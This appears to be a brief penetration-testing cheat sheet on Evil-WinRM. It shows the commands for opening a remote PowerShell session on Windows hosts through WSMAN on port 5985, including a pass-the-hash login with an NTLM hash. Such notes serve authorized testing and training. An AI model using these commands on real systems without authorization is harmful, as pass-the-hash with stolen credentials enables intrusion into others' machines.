# Evil-WinRM

Evil-WinRM is a tool used to get a full PowerShell RCE on Windows targets that are running services like `wsman`

```bash
evil-winrm -i TARGET_IP -u TARGET_USER
```

## Vulnerable services

### WSMAN
Defaultly runs on port 5985


## Log in with Evil-Winrm by "Passing the hash"
/!\ This only needs the second part (NTLM) of the hash  

```bash
evil-winrm -u "username" -H PUT_THE_NT_HASH_HERE -i <IP>
get powershell
```